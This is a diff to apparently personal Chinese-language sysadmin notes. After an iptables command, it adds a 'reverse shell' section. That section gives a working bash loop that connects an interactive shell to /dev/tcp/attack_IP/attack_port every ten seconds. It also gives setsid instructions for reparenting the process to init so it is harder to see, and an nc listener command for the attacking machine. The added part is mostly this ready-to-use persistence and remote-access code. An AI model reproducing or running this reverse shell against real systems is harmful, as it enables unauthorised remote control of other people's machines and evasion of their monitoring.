@@ -44,3 +44,26 @@ iptables -X
 ```shell
 sudo iptables -t nat -v -L -n --line-number # 显示iptables规则
 ```
+
+# reverse shell
+
+    启用tcp连接主机，每隔10秒连接一次。当主机开启监听就直接向靶机发送指令。
+    主机不在连接中，靶机上也看不到tcp信息，但是能看到进程信息。
+    所以要将启动的进程的父进程设置为init(1)，用setsid命令将程序执行启动
+1. 在靶机上启动反向shell
+
+    创建如下文件reverse_shell.sh
+```shell
+#!/bin/bash
+
+while true;do bash -i 2>/dev/null &> /dev/tcp/attack_IP/attack_port 0>&1;sleep 10; done;
+```
+    启动该程序
+```shell
+setsid reverse_shell.sh
+```
+
+2. 在攻击机器上接收
+```shell
+nc -lvp attack_port
+```
